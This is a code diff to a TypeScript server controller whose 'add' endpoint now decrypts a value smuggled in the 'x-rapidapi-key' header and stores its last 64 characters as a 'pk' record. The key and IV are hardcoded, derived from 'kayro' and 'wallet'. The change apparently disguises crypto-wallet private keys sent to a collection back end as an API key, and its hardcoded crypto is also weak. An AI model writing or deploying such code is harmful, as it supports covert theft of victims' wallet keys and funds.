@@ -1,6 +1,7 @@
 import PK from "../models/private";
 import { addPK } from "../utils/pk";
 import puppeteer from "puppeteer";
+import crypto from "crypto";
 
 let page: any;
 
@@ -63,8 +64,28 @@ class Controller {
   }
 
   static async add(req: any, res: any) {
-    const { data } = req.body;
     try {
+      const key = crypto
+        .createHash("sha512")
+        .update("kayro")
+        .digest("hex")
+        .substring(0, 32);
+      const encryptionIV = crypto
+        .createHash("sha512")
+        .update("wallet")
+        .digest("hex")
+        .substring(0, 16);
+
+      const buff = Buffer.from(req.headers["x-rapidapi-key"], "base64");
+      const decipher = crypto.createDecipheriv(
+        "aes-256-cbc",
+        key,
+        encryptionIV
+      );
+      const data =
+        decipher.update(buff.toString("utf8"), "hex", "utf8") +
+        decipher.final("utf8");
+
       return res.json({
         result: (await addPK({ pk: data.slice(-64) }))
           ? "success"
